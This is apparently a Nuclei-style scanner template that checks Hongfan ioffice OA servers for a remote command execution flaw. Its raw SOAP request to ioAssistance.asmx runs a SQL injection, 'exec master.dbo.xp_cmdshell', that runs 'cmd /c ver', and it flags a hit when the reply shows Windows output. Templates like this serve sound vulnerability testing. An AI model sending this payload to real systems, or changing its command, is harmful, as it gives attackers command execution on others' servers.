id: ioffice-oa-rce
info:
  author: Str1am
  name: "\u7EA2\u5E06 ioffice OA \u7CFB\u7EDF ioAssistance.asmx \u6587\u4EF6\u8FDC\
    \u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  severity: critical
  tags: oa,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <output>
    - Windows
  matchers-condition: and
  raw:
  - "POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\n\
    SOAPAction: http://tempuri.org/SignOut\nContent-Type: text/xml; charset=utf-8\n\
    \n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
    >\n    <soap:Body>\n      <SignOut xmlns=\"http://tempuri.org/\">\n        <sql>exec\
    \ master.dbo.xp_cmdshell 'cmd /c ver'</sql>\n      </SignOut>\n    </soap:Body>\n\
    \  </soap:Envelope>\n"
